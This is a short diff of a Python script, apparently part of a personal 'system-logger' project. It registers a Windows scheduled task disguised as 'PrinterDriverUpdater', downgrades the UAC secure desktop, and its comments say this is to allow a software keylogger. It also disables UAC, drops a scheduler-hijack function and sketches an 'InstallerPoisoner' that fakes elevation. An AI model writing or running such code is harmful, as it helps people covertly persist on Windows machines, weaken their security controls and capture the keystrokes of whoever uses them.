@@ -4,14 +4,8 @@ from subprocess import run
 task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"
 
 #Hijacking task scheduler, kinda?
-#def HijackInstaller(installer, ):
+#def InstallerPoisoner(installer, opencmd, cmddelay, scheduler):
     #Create .exe identical to installer, but with fake elevation then execution stuff
-    
-
-
-def HijackScheduler():
-    #Create a scheduled task to open cmd.exe with HighestAvailable perms
-    system("cd C:/Users/lhill23/Desktop & VEXcodeV5-20220228.exe")
 
 def DowngradeUAC():
     #Stop UAC opening on secure desktop, allowing for software keylogger
@@ -25,5 +19,5 @@ def DisableUAC():
 
 if __name__ == "__main__":
     DowngradeUAC()
-    HijackScheduler()
+    DisableUAC()
     run(task)
